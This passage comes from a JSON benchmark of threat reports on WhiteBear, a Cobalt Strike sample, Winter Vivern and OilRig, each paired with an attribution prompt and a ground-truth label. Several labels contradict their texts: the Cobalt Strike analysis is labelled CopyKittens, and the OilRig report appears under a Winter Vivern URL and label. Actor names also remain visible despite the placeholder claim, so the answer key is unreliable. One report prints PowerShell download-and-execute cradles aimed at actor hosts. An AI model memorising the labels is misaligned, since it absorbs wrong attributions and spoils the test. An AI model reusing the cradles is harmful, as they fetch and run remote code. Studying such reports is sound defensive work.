LocalTansport manager re-encrypts the packet, serializes it (again), and pushes the packet via a named pipe on the local network to another hop, (NullSessionPipes). This effectively makes each infected node a packet router.\nThe Autorun manager subsystem is responsible for tracking the way that the malicious module starts in the system and it maintains several different methods for starting automatically (shown below):\nLinkAutorun The subsystem searches for a LNK file in the target directory, changes the path to “cmd.exe” and the description to ‘ /q /c start “” “%s” && start “” “%s” ‘\nTaskScheduler20Autorun The subsystem creates the ITaskService (works only on Windows Vista+) and uses the ITaskService interface to create a new task with a logon trigger\nStartupAutorun The subsystem creates a LNK file in %STARTUP%\nScreenSaverAutorun The subsystem installs as a current screensaver with a hidden window\nHiddenTaskAutorun The subsystem creates the task ITaskScheduler (works only on pre-Vista NT). The task trigger start date is set to the creation date of the Windows directory\nShellAutorun Winlogon registry [HKCUSoftwareMicrosoftWindows NTCurrentVersionWinlogon] Shell=”explorer.exe, …”\nFile Uninstallation is done in a discreet manner. The file is filled with zeroes, then renamed to a temporary filename before being deleted\nWhiteBear Transport library (aka “Internet Relations”, “Pipe Relations”)\nSample MD5: 19ce5c912768958aa3ee7bc19b2b032c\nType: PE DLL\nLinker timestamp: 2002.02.05 17:58:22 (GMT)\nLinker version: 10.0\nSignature “Solid Loop Ldt” UTCTime 15/10/2015 00:00:00 GMT – UTCTime 14/10/2016 23:59:59 GMT\nThis transport library does not appear on disk in its PE format. It is maintained as encrypted resource 107 in the orchestrator module, then decrypted and loaded by the orchestrator directly into the memory of the target process. This C2 interaction module is independent, once started, it interacts with the orchestrator using its local named pipe.\nTo communicate with its C2 server, the transport library uses the system user agent or default “Mozilla/4.0 (compatible; MSIE 6.0)”.\nBefore attempting a connection with its configured C2 server, the module checks if the victim system is connected to Internet by sending HTTP 1.1 GET / requests to the following servers (this process stops after the first successful connection):\n• update.microsoft.com\n• microsoft.com\n• windowsupdate.microsoft.com\n• yahoo.com\n• google.com\nIf there is no Internet connection available, the module changes state to, “CANNOT_WORK” and notifies the peer by sending command “7” over the local pipe.\nThe C2 configuration is obtained from the main module with the command “5”. This checks whether the module complies with the schedule specified in the C2 settings (which includes inactivity time and the interval between connections). The C2 interaction stages have interesting function names and an odd misspelling, indicating that the developer may not be a native English speaker (or may have learned the English language in a British setting):\n“InternetRelations::GetInetConnectToGazer”\n“InternetRelations::ReceiveMessageFromCentre”\n“InternetRelations::SendMessageToCentre”\n“PipeRelations::CommunicationTpansportPipe”\nThe module writes the encrypted log to %TEMP%CVRG38D9.tmp.cvr The module sends a HTTP 1.0 GET request through a randomly generated path to the C2 server. The server’s reply is expected to have its MD5 checksum appended to the packet. If C2 interaction fails, the module sends the command “10” (“NO_CONNECT_TO_GAYZER”) to the orchestrator.\nUnusual WhiteBear Encryption\nThe encryption implemented in the WhiteBear orchestrator is particularly interesting. We note that the resource section is encrypted/decrypted and packed/decompressed with RSA+3DES+BZIP2. This implementation is unique and includes the format of the private key as stored in the resource section. 3DES is present in Sofacy and Duqu2 components, however they are missing in this Microsoft-centric RSA encryption technique. The private key format used in this schema and RSA crypto combination with 3DES is (currently) unique to this threat actor.\nThe private key itself is stored as a raw binary blob, in a format similar to the one Microsoft code uses in PVK format. This format is not officially documented, but its structures and handling are coded into OpenSSL. This private key value is stored in the orchestrator resources without valid headers. The orchestrator code prepends valid headers and passes the results to OpenSSL functions that parse the blob.\nDigital Code-Signing Certificate – Fictional Corporation or Assumed Identity?\nMost WhiteBear samples are signed with a valid code signing certificate issued for “Solid Loop Ltd”, a once-registered British organization. Solid Loop is likely a phony front organization or a defunct organization and actors assumed its identity to abuse the name and trust, in order to attain deceptive code-signing digital certificates.\nWhiteBear Command and Control\nThe WhiteBear C2 servers are consistent with long standing Turla infrastructure management practices, so the backdoors callback to a mix of compromised servers and hijacked destination satellite IP hosts. For example, direct, hardcoded Turla satellite IP C2 addresses are shown below:\nC2 IP Address               Geolocation                            IP Space Owner\n169.255.137[.]203         South Sudan                           IPTEC, VSAT\n217.171.86[.]137           Congo                                     Global Broadband Solution, Kinshasa VSAT\n66.178.107[.]140           Unknown – Likely Africa          SES/New Skies Satellites\nTargeting and Victims\nWhiteBear targets over the course of a couple years are related to government foreign affairs, international organizations, and later, defense organizations. The geolocation of the incidents are below:\n•\tEurope\n•\tSouth Asia\n•\tCentral Asia\n•\tEast Asia\n•\tSouth America\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "White Bear"
    },
    {
        "url": "https://medium.com/@b.magnezi/malware-analysis-cobalt-strike-92ef02b35ae0",
        "Text": "Cobalt Strike is a versatile tool for Red Team operations and penetration testing. However, threat actors also use it for malicious activities like establishing covert communication, conducting post-exploitation tasks, moving laterally across networks, crafting and delivering weaponized payloads, and executing social engineering attacks.\n\nFigure 1: Malware Bazaar sample\nAfter downloading and extracting the zip file, two sections were observed in the BAT file. The first section contained two chunks of Base64-encoded code, as shown in Figure 2. It was suspected that these might be a Base64-encoded file, but decoding them did not yield any results. The second section appeared to utilize a simple replace obfuscation, as shown in Figure 3.\n\nFigure 2: First section of the original BAT file\n\nFigure 3: Marking what looked like replacing “CxVtt” with NULL\nThe second section contained additional instances of the replace function. Consequently, the cleaning process was continued using it. This part of the code seemed to decrypt something using AES encryption and decompress it using Gzip, as illustrated in Figure 4.\n\nFigure 4: After Cleaning of the 2nd part\nIt was decided to attempt using CyberChef to decrypt what was suspected to be another dropped file. Subsequently, it was confirmed that the suspicion was correct, and the dropped files were successfully extracted, as illustrated in Figure 5.\n\n\nFigure 5: Using the AES Key+IV and Gunzip on the Base64 code , which resulted an EXE file\nThe extracted files were both written in .NET, allowing for debugging in DNSPY. During debugging, additional memory manipulation was observed, leading to the suspicion that there might be another hidden file.\n\nFigure 6: Embedding Resource\nObserving the array in memory confirmed my suspicion. It was observed that the memory started with the header “1F 8B,” indicating a Gzip file as shown in Figure 7.\n\nFigure 7: Finding the embedded file inside the memory\nFor the last time I used CyberChef to Decompress as shown in Figure 8.\n\nFigure 8: Extracting embedded EXE file\nAt that point, a decision was made to execute the file and gather some artifacts and IOCs. As shown below, an EXE embedded in the running process was successfully dumped.\n\nFigure 9: Dumping EXE from running process\nThe network traffic was encrypted, so the combination of inetsim + Fiddler was used to follow the requests without the risk of being infected.\nInetsim is an open-source tool for simulating internet services like HTTP, DNS, and FTP. It helps observe malware behavior without connecting to real servers, reducing infection risks.\nFiddler is a web debugging proxy tool that logs and modifies HTTP/HTTPS traffic. It decrypts HTTPS traffic with a root certificate.\nUsing inetsim with Fiddler allows to safely intercept and analyze encrypted network traffic, gaining insights into malware communication and payloads without risking infection.\n\nFigure 10: Analyzing network traffic using the combination of Fiddler + inetsim\nIOCs:\n•\torigin.bat — 4d1a54992dc1883a86069182e55bccf4\n•\tout1.exe — c58f43348436a19ca37a676b477a137f\n•\tout2.exe — 8d8fe14374cb94fe10070d9591fea3bb\n•\t4000.exe — 30d2256f99c9dc5e6846838f655fae34\n•\tpickilish[.]com\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "CopyKittens"
    },
    {
        "url": "https://www.sentinelone.com/labs/winter-vivern-uncovering-a-wave-of-global-espionage/",
        "Text": "Executive Summary\n•\tSentinelLabs has conducted an investigation into Winter Vivern Advanced Persistent Threat (APT) activity, leveraging observations made by The Polish CBZC and Ukraine CERT. Our research has uncovered a previously unknown set of espionage campaigns and targeting activities conducted by this threat actor.\n•\tOur analysis indicates that Winter Vivern’s activities are closely aligned with global objectives that support the interests of Belarus and Russia’s governments. The APT has targeted a variety of government organizations, and in a rare instance, a private telecommunication organization.\n•\tThe threat actor employs various tactics, such as phishing websites, credential phishing, and deployment of malicious documents, that are tailored to the targeted organization’s specific needs. This results in the deployment of custom loaders and malicious documents, which enable unauthorized access to sensitive systems and information.\nBackground on Winter Vivern\nThe Winter Vivern Advanced Persistent Threat (APT) is a noteworthy yet relatively underreported group that operates with pro-Russian objectives. DomainTools initially publicized the group in early 2021, naming it based on an initial command-and-control beacon URL string “wintervivern,” which is no longer in use. Subsequently, Lab52 shared additional analysis several months later, identifying new activity associated with Winter Vivern.\nThe group has avoided public disclosure since then, until recent attacks targeting Ukraine. A part of a Winter Vivern campaign was reported in recent weeks by the Polish CBZC, and then the Ukraine CERT as UAC-0114. In this activity, CERT-UA and the CBZC collaborated on the release of private technical details which assisted in our research to identify a wider set of activity on the threat actor, in addition to new victims and previously unknown specific technical details. Overall, we find that the Winter Vivern APT is a resource-limited but highly creative group that shows restraint in the scope of their attacks. Our analysis indicates that Winter Vivern activity aligns closely with global objectives that support the interests of Belarus and Russia’s governments.\nTargeted Organizations\nOur analysis of Winter Vivern’s past activity indicates that the APT has targeted various government organizations since 2021, including those in Lithuania, India, Vatican, and Slovakia.\nRecently linked campaigns reveal that Winter Vivern has targeted Polish government agencies, the Ukraine Ministry of Foreign Affairs, the Italy Ministry of Foreign Affairs, and individuals within the Indian government. Of particular interest is the APT’s targeting of private businesses, including telecommunications organizations that support Ukraine in the ongoing war.\nThe threat actor’s targeting of a range of government and private entities highlights the need for increased vigilance as their operations include a global set of targets directly and indirectly involved in the war.\nLuring Methodology\nWinter Vivern’s tactics have included the use of malicious documents, often crafted from authentic government documents publicly available or tailored to specific themes. More recently, the group has utilized a new lure technique that involves mimicking government domains to distribute malicious downloads.\nIn early 2023, Winter Vivern targeted specific government websites by creating individual pages on a single malicious domain that closely resembled those of Poland’s Central Bureau for Combating Cybercrime, the Ukraine Ministry of Foreign Affairs, and the Security Service of Ukraine.\nMalicious Page Mimicking cbzc.policja.gov.pl\nIn mid 2022 the attackers also made an interesting, lesser observed, use of government email credential phishing webpages. One example is ocspdep[.]com, which was used in targeting users of the Indian government’s legitimate email service email.gov.in.\nemail.gov.in Login Page\nLooking back at less recent activity, we can see in December 2022 the group likely targeted individuals associated with the Hochuzhit.com (“I Want to Live”) project, the Ukraine government website offering guidance and instructions to Russian and Belarus Armed Forces seeking to voluntarily surrender in the war. In these attacks the threat actor made use of a macro-enabled Excel spreadsheet to infect the target.\nWhen the threat actor seeks to compromise the organization beyond the theft of legitimate credentials, Winter Vivern tends to rely on shared toolkits, and the abuse of legitimate Windows tools.\nView Into The Arsenal\nWinter Vivern APT falls into a category of scrappy threat actors, being quite resourceful and able to accomplish a lot with potentially limited resources while willing to be flexible and creative in their approach to problem-solving.\nRecent campaigns demonstrate the group’s use of lures to initiate the infection process, utilizing batch scripts disguised as virus scanners to prompt downloads of malware from attacker-controlled servers.\nFake Virus Scan Loaders\nIn the case of malicious documents, such as the Hochu Zhit themed XLS files, PowerShell is called through a macro. Specifically, Invoke-Expression cmdlet is executed, beaconing to the malicious destination of ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php.\npowershell.exe -noexit -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};\niex (new-object net.webclient).DownloadString('hxxps://ocs-romastassec[.]com/goog_comredira3cf7ed34f8.php')\"\nOne malware family of recent activity is APERETIF, named by CERT-UA based on the development PDB path inside the sample. We identified a related sample following similar use, although it is less complete in malicious design. These samples align with the theme of attacks mimicking a virus scanner, presenting users with the fake scan results similar to the script loaders. Known samples are PE32 executables, written in Visual C++, with a compilation timestamp of May 2021. We assess the threat actor shifted from these original executables to the delivery of batch files with PowerShell scripting, with overlap in their use.\nf39b260a9209013d9559173f12fbc2bd5332c52a\tC:\\Users\\user_1\\source\\repos\\Aperitivchick\\Release\\SystemProtector.pdb\na19d46251636fb46a013c7b52361b7340126ab27\tC:\\Users\\user_1\\sourcev\reposv\\Aperitivchick 2\\Release\\SystemProtector.pdb\nAPERETIF is a trojan, automating the collection of victim details, maintaining access, and beaconing outbound the actor-controlled domain marakanas[.]com. As with the previous script, the trojan makes use of whomami within PowerShell in its initial activity to beacon outbound for further instructions and/or downloads.\nactor-controlled.exe -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; \n$a=whoami; \niex (New-Object Net.WebClient).DownloadString(r\"hxxps:\\marakanas[.]com\\Kkdn7862Jj6h2oDASGmpqU4Qq4q4.php?idU=$a\")\"\nAPERETIF also uses the signatures.php?id=1 URI through HTTPS GET requests. The group made use of compromised WordPress websites to host the malware, such as with hxxps://applesaltbeauty[.]com/wordpress/wp-includes/widgets/classwp/521734i and hxxps://natply[.]com/wordpress/wp-includes/fonts/ch/097214o serving as the download location for APERETIF during initial attack stages.\nMoreover, Winter Vivern employs other intrusion techniques, such as exploiting application vulnerabilities to compromise specific targets or staging servers. An attacker-controlled server was found to host a login page for the Acunetix web application vulnerability scanner, which may serve as a supplementary resource for scanning target networks and potentially used to compromise WordPress sites for malware hosting purposes.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Winter Wivern"
    },
    {
        "url": "https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers/",
        "Text": "ESET researchers have analyzed two campaigns by the OilRig APT group: Outer Space (2021), and Juicy Mix (2022). Both of these cyberespionage campaigns targeted Israeli organizations exclusively, which is in line with the group’s focus on the Middle East, and used the same playbook: OilRig first compromised a legitimate website to use as a C&C server and then used VBS droppers to deliver a C#/.NET backdoor to its victims, while also deploying a variety of post-compromise tools mostly used for data exfiltration on the target systems.\nIn their Outer Space campaign, OilRig used a simple, previously undocumented C#/.NET backdoor we named Solar, along with a new downloader, SampleCheck5000 (or SC5k), that uses the Microsoft Office Exchange Web Services API for C&C communication. For the Juicy Mix campaign, the threat actors improved on Solar to create the Mango backdoor, which possesses additional capabilities and obfuscation methods. In addition to detecting the malicious toolset, we also notified the Israeli CERT about the compromised websites.\nKey points of this blogpost:\n•\tESET observed two OilRig campaigns which occurred throughout 2021 (Outer Space) and 2022 (Juicy Mix).\n•\tThe operators exclusively targeted Israeli organizations and compromised legitimate Israeli websites for use in their C&C communications.\n•\tThey used a new, previously undocumented C#/.NET first-stage backdoor in each campaign: Solar in Outer Space, then its successor Mango in Juicy Mix.\n•\tBoth backdoors were deployed by VBS droppers, presumably spread via spearphishing emails.\n•\tA variety of post-compromise tools were deployed in both campaigns, notably the SC5k downloader that uses Microsoft Office Exchange Web Services API for C&C communication, and several tools to steal browser data and credentials from Windows Credential Manager.\nOilRig, also known as APT34, Lyceum, or Siamesekitten, is a cyberespionage group that has been active since at least 2014 and is commonly believed to be based in Iran. The group targets Middle Eastern governments and a variety of business verticals, including chemical, energy, financial, and telecommunications. OilRig carried out the DNSpionage campaign in 2018 and 2019, which targeted victims in Lebanon and the United Arab Emirates. In 2019 and 2020, OilRig continued attacks with the HardPass campaign, which used LinkedIn to target Middle Eastern victims in the energy and government sectors. In 2021, OilRig updated its DanBot backdoor and began deploying the Shark, Milan, and Marlin backdoors, mentioned in the T3 2021 issue of the ESET Threat Report.\nIn this blogpost, we provide technical analysis of the Solar and Mango backdoors, of the VBS dropper used to deliver Mango, and of the post-compromise tools deployed in each campaign.\nAttribution\nThe initial link that allowed us to connect the Outer Space campaign to OilRig is the use of the same custom Chrome data dumper (tracked by ESET researchers under the name MKG) as in the Out to Sea campaign. We observed the Solar backdoor deploy the very same sample of MKG as in Out to Sea on the target’s system, along with two other variants.\nBesides the overlap in tools and targeting, we also saw multiple similarities between the Solar backdoor and the backdoors used in Out to Sea, mostly related to upload and download: both Solar and Shark, another OilRig backdoor, use URIs with simple upload and download schemes to communicate with the C&C server, with a “d” for download and a “u” for upload; additionally, the downloader SC5k uses uploads and downloads subdirectories just like other OilRig backdoors, namely ALMA, Shark, DanBot, and Milan. These findings serve as a further confirmation that the culprit behind Outer Space is indeed OilRig.\nAs for the Juicy Mix campaign’s ties to OilRig, besides targeting Israeli organizations – which is typical for this espionage group – there are code similarities between Mango, the backdoor used in this campaign, and Solar. Moreover, both backdoors were deployed by VBS droppers with the same string obfuscation technique. The choice of post-compromise tools employed in Juicy Mix also mirrors previous OilRig campaigns.\nOuter Space campaign overview\nNamed for the use of an astronomy-based naming scheme in its function names and tasks, Outer Space is an OilRig campaign from 2021. In this campaign, the group compromised an Israeli human resources site and subsequently used it as a C&C server for its previously undocumented C#/.NET backdoor, Solar. Solar is a simple backdoor with basic functionality such as reading and writing from disk, and gathering information.\nThrough Solar, the group then deployed a new downloader SC5k, which uses the Office Exchange Web Services API to download additional tools for execution, as shown in Figure 1. In order to exfiltrate browser data from the victim’s system, OilRig used a Chrome-data dumper called MKG.\nFigure 1. Overview of OilRig’s Outer Space compromise chain\nJuicy Mix campaign overview\nIn 2022 OilRig launched another campaign targeting Israeli organizations, this time with an updated toolset. We named the campaign Juicy Mix for the use of a new OilRig backdoor, Mango (based on its internal assembly name, and its filename, Mango.exe). In this campaign, the threat actors compromised a legitimate Israeli job portal website for use in C&C communications. The group’s malicious tools were then deployed against a healthcare organization, also based in Israel.\nThe Mango first-stage backdoor is a successor to Solar, also written in C#/.NET, with notable changes that include exfiltration capabilities, use of native APIs, and added detection evasion code.\nAlong with Mango, we also detected two previously undocumented browser-data dumpers used to steal cookies, browsing history, and credentials from the Chrome and Edge browsers, and a Windows Credential Manager stealer, all of which we attribute to OilRig. These tools were all used against the same target as Mango, as well as at other compromised Israeli organizations throughout 2021 and 2022. Figure 2 shows an overview of how the various components were used in the Juicy Mix campaign.\nFigure 2. Overview of components used in OilRig’s Juicy Mix campaign\nTechnical analysis\nIn this section, we provide a technical analysis of the Solar and Mango backdoors and the SC5k downloader, as well as other tools that were deployed to the targeted systems in these campaigns.\nVBS droppers\nTo establish a foothold on the target’s system, Visual Basic Script (VBS) droppers were used in both campaigns, which were very likely spread by spearphishing emails. Our analysis below focuses on the VBS script used to drop Mango (SHA-1: 3699B67BF4E381847BF98528F8CE2B966231F01A); note that Solar’s dropper is very similar.\nThe dropper’s purpose is to deliver the embedded Mango backdoor, schedule a task for persistence, and register the compromise with the C&C server. The embedded backdoor is stored as a series of base64 substrings, which are concatenated and base64 decoded. As shown in Figure 3, the script also uses a simple string deobfuscation technique, where strings are assembled using arithmetic operations and the Chr function.\nFigure 3. String deobfuscation technique used by OilRig’s VBS dropper for Mango\nOn top of that, Mango’s VBS dropper adds another type of string obfuscation and code to set up persistence and register with the C&C server. As shown in Figure 4, to deobfuscate some strings, the script replaces any characters in the set #*+-_)(}{@$%^& with 0, then divides the string into three-digit numbers that are then converted into ASCII characters using the Chr function. For example, the string 116110101109117+99111$68+77{79$68}46-50108109120115}77 translates to Msxml2.DOMDocument.\nFigure 4. String obfuscation function used by Mango’s VBS dropper\nOnce the backdoor is embedded on the system, the dropper moves on to create a scheduled task that executes Mango (or Solar, in the other version) every 14 minutes. Finally, the script sends a base64-encoded name of the compromised computer via a POST request to register the backdoor with its C&C server.\nSolar backdoor\nSolar is the backdoor used in OilRig’s Outer Space campaign. Possessing basic functionalities, this backdoor can be used to, among other things, download and execute files, and automatically exfiltrate staged files.\nWe chose the name Solar based on the filename used by OilRig, Solar.exe. It is a fitting name since the backdoor uses an astronomy naming scheme for its function names and tasks used throughout the binary (Mercury, Venus, Mars, Earth, and Jupiter).\nSolar begins execution by performing the steps shown in Figure 5.\nFigure 5. Initial execution flow of Solar\nThe backdoor creates two tasks, Earth and Venus, that run in memory. There is no stop function for either of the two tasks, so they will run indefinitely. Earth is scheduled to run every 30 seconds and Venus is set to run every 40 seconds.\nEarth is the primary task, responsible for the bulk of Solar’s functions. It communicates with the C&C server using the function MercuryToSun, which sends basic system and malware version information to the C&C server and then handles the server’s response. Earth sends the following info to the C&C server:\n•\tThe string (@) <system hostname>; the whole string is encrypted.\n•\tThe string 1.0.0.0, encrypted (possibly a version number).\n•\tThe string 30000, encrypted (possibly the scheduled runtime of Earth in milliseconds).\nEncryption and decryption are implemented in functions named JupiterE and JupiterD, respectively. Both of them call a function named JupiterX, which implements an XOR loop as shown in Figure 6.\nFigure 6. The for loop in JupiterX that is used to encrypt and decrypt data\nThe key is derived from a hardcoded global string variable, 6sEj7*0B7#7, and a nonce: in this case, a random hex string from 2–24 characters long. Following the XOR encryption, standard base64 encoding is applied.\nAn Israeli human resources company’s web server, which OilRig compromised at some point before deploying Solar, was used as the C&C server:\nhttp://organization.co[.]il/project/templates/office/template.aspx?rt=d&sun=<encrypted_MachineGuid>&rn=<encryption_nonce>\nPrior to being appended to the URI, the encryption nonce is encrypted, and the value of the initial query string, rt, is set to d here, likely for “download”.\nThe last step of the MercuryToSun function is to process a response from the C&C server. It does so by retrieving a substring of the response, which is found between the characters QQ@ and @kk. This response is a string of instructions separated by asterisks (*) that is processed into an array. Earth then carries out the backdoor commands, which include downloading additional payloads from the server, listing files on the victim’s system, and running specific executables.\nCommand output is then gzip compressed using the function Neptune and encrypted with the same encryption key and a new nonce. Then the results are uploaded to the C&C server, thus:\nhttp://organization.co[.]il/project/templates/office/template.aspx?rt=u&sun=<MachineGuid>&rn=<new_nonce>\nMachineGuid and the new nonce are encrypted with the JupiterE function, and here the value of rt is set to u, likely for “upload”.\nVenus, the other scheduled task, is used for automated data exfiltration. This small task copies the content of files from a directory (also named Venus) to the C&C server. These files are likely dropped here by some other, as yet unidentified, OilRig tool. After uploading a file, the task deletes it from disk.\nMango backdoor\nFor its Juicy Mix campaign, OilRig switched from the Solar backdoor to Mango. It has a similar workflow to Solar and overlapping capabilities, but there are nevertheless several notable changes:\n•\tUse of TLS for C&C communications.\n•\tUse of native APIs, rather than .NET APIs, to execute files and shell commands.\n•\tAlthough not actively used, detection evasion code was introduced.\n•\tSupport for automated exfiltration (Venus in Solar) has been removed; instead, Mango supports an additional backdoor command for exfiltrating selected files.\n•\tSupport for log mode has been removed, and symbol names have been obfuscated.\nContrary to Solar’s astronomy-themed naming scheme, Mango obfuscates its symbol names, as can be seen in Figure 7.\nFigure 7. Unlike its predecessor Solar (left), Mango’s symbols have been obfuscated\nBesides the symbol name obfuscation, Mango also uses the string stacking method (as shown in Figure 8) to obfuscate strings, which complicates the use of simple detection methods.\nFigure 8. Mango uses string stacking to obfuscate strings and thwart simple detection mechanisms\nSimilar to Solar, the Mango backdoor starts by creating an in-memory task, scheduled to run indefinitely every 32 seconds. This task communicates with the C&C server and executes backdoor commands, similar to Solar’s Earth task. While Solar also creates Venus, a task for automated exfiltration, this functionality has been replaced in Mango by a new backdoor command.\nIn the main task, Mango first generates a victim identifier, <victimID>, to be used in C&C communications. The ID is computed as an MD5 hash of <machine name><username>, formatted as a hexadecimal string.\nTo request a backdoor command, Mango then sends the string d@<victimID>@<machine name>|<username> to the C&C server http://www.darush.co[.]il/ads.asp – a legitimate Israeli job portal, likely compromised by OilRig before this campaign. We notified the Israeli national CERT organization about the compromise.\nThe request body is constructed as follows:\n•\tThe data to be transmitted is XOR encrypted using the encryption key Q&4g, then base64 encoded.\n•\tA pseudorandom string of 3–14 characters is generated from this alphabet (as it appears in the code): i8p3aEeKQbN4klFMHmcC2dU9f6gORGIhDBLS0jP5Tn7o1AVJ.\n•\tThe encrypted data is inserted in a pseudorandom position within the generated string, enclosed between [@ and @] delimiters.\nTo communicate with its C&C server, Mango uses the TLS (Transport Layer Security) protocol, which is used to provide an additional layer of encryption.\nSimilarly, the backdoor command received from the C&C server is XOR encrypted, base64 encoded, and then enclosed between [@ and @] within the HTTP response body. The command itself is either NCNT (in which case no action is taken), or a string of several parameters delimited by @, as detailed in Table 1, which lists Mango’s backdoor commands. Note that <Arg0> is not listed in the table, but is used in the response to the C&C server.\nTable 1. List of Mango’s backdoor commands\nEach backdoor command is handled in a new thread, and their return values are then base64 encoded and combined with other metadata. Finally, that string is sent to the C&C server using the same protocol and encryption method as described above.\nUnused detection evasion technique\nInterestingly, we found an unused detection evasion technique within Mango. The function responsible for executing files and commands downloaded from the C&C server takes an optional second parameter – a process ID. If set, Mango then uses the UpdateProcThreadAttribute API to set the PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY (0x20007) attribute for the specified process to value: PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x100000000000), as shown in Figure 9.\nFigure 9. Unused security product evasion code in Mango backdoor\nThis technique’s goal is to block endpoint security solutions from loading their user-mode code hooks via a DLL in this process. While the parameter was not used in the sample we analyzed, it could be activated in future versions.\nVersion 1.1.1\nUnrelated to the Juicy Mix campaign, in July 2023 we found a new version of the Mango backdoor (SHA-1: C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A), uploaded to VirusTotal by several users under the name Menorah.exe. The internal version in this sample was changed from 1.0.0 to 1.1.1, but the only notable change is the use of a different C&C server, http://tecforsc-001-site1.gtempurl[.]com/ads.asp.\nAlong with this version, we also discovered a Microsoft Word document (SHA-1: 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB) with a malicious macro that drops the backdoor. Figure 10 shows the fake warning message, enticing the user to enable macros for the document, and the decoy content that is displayed afterwards, while the malicious code is running in the background.\n\nFigure 10. Microsoft Word document with a malicious macro that drops Mango v1.1.1\nPost-compromise tools\nIn this section, we review a selection of post-compromise tools used in OilRig’s Outer Space and Juicy Mix campaigns, aimed at downloading and executing additional payloads, and stealing data from the compromised systems.\nSampleCheck5000 (SC5k) downloader\nSampleCheck5000 (or SC5k) is a downloader used to download and execute additional OilRig tools, notable for using the Microsoft Office Exchange Web Services API for C&C communication: the attackers create draft messages in this email account and hide the backdoor commands in there. Subsequently, the downloader logs into the same account, and parses the drafts to retrieve commands and payloads to execute.\nSC5k uses predefined values – Microsoft Exchange URL, email address, and password – to log into the remote Exchange server, but it also supports the option to override these values using a configuration file in the current working directory named setting.key. We chose the name SampleCheck5000 based on one of the email addresses that the tool used in the Outer Space campaign.\nOnce SC5k logs into the remote Exchange server, it retrieves all the emails in the Drafts directory, sorts them by most recent, keeping only the drafts that have attachments. It then iterates over every draft message with an attachment, looking for JSON attachments that contain \"data\" in the body. It extracts the value from the key data in the JSON file, base64 decodes and decrypts the value, and calls cmd.exe to execute the resulting command line string. SC5k then saves the output of the cmd.exe execution to a local variable.\nAs the next step in the loop, the downloader reports the results to the OilRig operators by creating a new email message on the Exchange server and saving it as a draft (not sending), as shown in Figure 11. A similar technique is used to exfiltrate files from a local staging folder. As the last step in the loop, SC5k also logs the command output in an encrypted and compressed format on disk.\nFigure 11. Email message creation by SC5k\nBrowser-data dumpers\nIt is characteristic of OilRig operators to use browser-data dumpers in their post-compromise activities. We discovered two new browser-data stealers among the post-compromise tools deployed in the Juicy Mix campaign alongside the Mango backdoor. They dump the stolen browser data in the %TEMP% directory into files named Cupdate and Eupdate (hence our names for them: CDumper and EDumper).\nBoth tools are C#/.NET browser-data stealers, collecting cookies, browsing history, and credentials from the Chrome (CDumper) and Edge (EDumper) browsers. We focus our analysis on CDumper, since both stealers are practically identical, save for some constants.\nWhen executed, CDumper creates a list of users with Google Chrome installed. On execution, the stealer connects to the Chrome SQLite Cookies, History and Login Data databases under %APPDATA%\\Local\\Google\\Chrome\\User Data, and collects browser data including visited URLs and saved logins, using SQL queries.\nThe cookie values are then decrypted, and all collected information is added to a log file named C:\\Users\\<user>\\AppData\\Local\\Temp\\Cupdate, in cleartext. This functionality is implemented in CDumper functions named CookieGrab (see Figure 12), HistoryGrab, and PasswordGrab. Note that there is no exfiltration mechanism implemented in CDumper, but Mango can exfiltrate selected files via a backdoor command.\nFigure 12. CDumper’s CookieGrab function dumps and decrypts cookies from the Chrome data store\nIn both Outer Space and the earlier Out to Sea campaign, OilRig used a C/C++ Chrome data dumper called MKG. Like CDumper and EDumper, MKG was also able to steal usernames and passwords, browsing history, and cookies from the browser. This Chrome data dumper is typically deployed in the following file locations (with the first location being the most common):\n•\t %USERS%\\public\\programs\\vmwaredir\\<random_14_character_string>\\mkc.exe\n•\t%USERS%\\Public\\M64.exe\nWindows Credential Manager stealer\nBesides browser-data dumping tools, OilRig also used a Windows Credential Manager stealer in the Juicy Mix campaign. This tool steals credentials from Windows Credential Manager, and similar to CDumper and EDumper, stores them in the %TEMP% directory – this time into a file named IUpdate (hence the name IDumper). Unlike CDumper and EDumper, IDumper is implemented as a PowerShell script.\nAs with the browser dumper tools, it is not uncommon for OilRig to collect credentials from the Windows Credential Manager. Previously, OilRig’s operators were observed using VALUEVAULT, a publicly available, Go-compiled credential-theft tool (see the 2019 HardPass campaign and a 2020 campaign), for the same purpose.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Winter Wivern"
    },
    {
        "url": "https://asec.ahnlab.com/en/56405/",
